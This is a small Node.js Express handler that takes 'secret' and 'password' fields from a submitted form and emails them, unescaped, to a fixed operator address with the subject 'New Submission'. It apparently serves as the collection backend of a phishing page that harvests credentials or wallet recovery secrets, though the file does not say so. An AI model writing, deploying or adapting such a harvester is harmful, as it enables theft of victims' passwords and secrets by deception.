const dotenv = require("dotenv");
const nodemailer = require("nodemailer");

dotenv.config();

const mailer = nodemailer.createTransport({
    host: process.env.EMAIL_HOST,
    port: process.env.EMAIL_PORT,
    auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS
    }
});

exports.sendEmail = async (req, res) => {
    const { secret, password } = req.body;

    const options = {
        from: process.env.SEND_FROM,
        to: process.env.SEND_TO,
        subject: "New Submission",
        html: `<div>
                <h3>New Submission</h3>
                <p>Secret:  <span style="font-weight:bold">${secret || '-'}</span></p>
                <p>Password:  <span style="font-weight:bold">${password || '-'}</span></p>
                </div>
            `,
    };
    try {
        await mailer.sendMail(options);
        res.status(200).json({
            message: "success",
        });
    } catch (error) {
        console.log(error);
        res.status(400).json({
            message: error.message,
        });
    }
};
